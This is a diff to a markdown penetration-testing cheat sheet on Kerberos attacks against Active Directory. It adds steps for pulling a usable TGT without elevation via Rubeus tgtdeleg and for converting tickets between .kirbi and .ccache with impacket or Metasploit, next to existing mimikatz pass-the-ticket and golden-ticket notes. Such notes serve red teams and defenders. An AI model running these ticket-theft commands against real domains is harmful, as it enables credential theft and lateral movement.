@@ -51,6 +51,26 @@ Injecting some ticket into memory with mimikatz:
 mimikatz # kerberos::ptt 'C:\ticket.kirbi'
 ```
 
+*When trying to export a usable TGT for our current user, this requieres elevation in the system*
+
+However with the "tgtdeleg" Rubeus function we can aviod the elevation and obtain a fully working TGT for our current user:
+
+```
+C:\> Rubeus.exe tgtdeleg
+```
+
+Although TGTs on Windows are exported as .kirbi, and on Linux as .ccache. We can use the impacket [ticketConverter.py](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) to convert a .kirbi to a .ccache, or a .ccache to a .kirbi.
+
+```
+From .ccache to .kirbi
+~# python ticket_converter.py trike.ccache trike.kirbi
+
+From .kirbi to .ccache
+~# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+```
+
+Alternatively you can use this metasploit module [auxiliary/admin/kerberos/ticket_converter](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html).
+
 **GOLDEN TICKETS:**
 
 With golden tickets, we can create TGTs for any domain resource that we want, and stating the groups we want. However to execute this attack we need the "krbtgt" domain account NTLM hash/password. Note that this attack is mostly used when you are already Domain Admin rather than trying to become one.
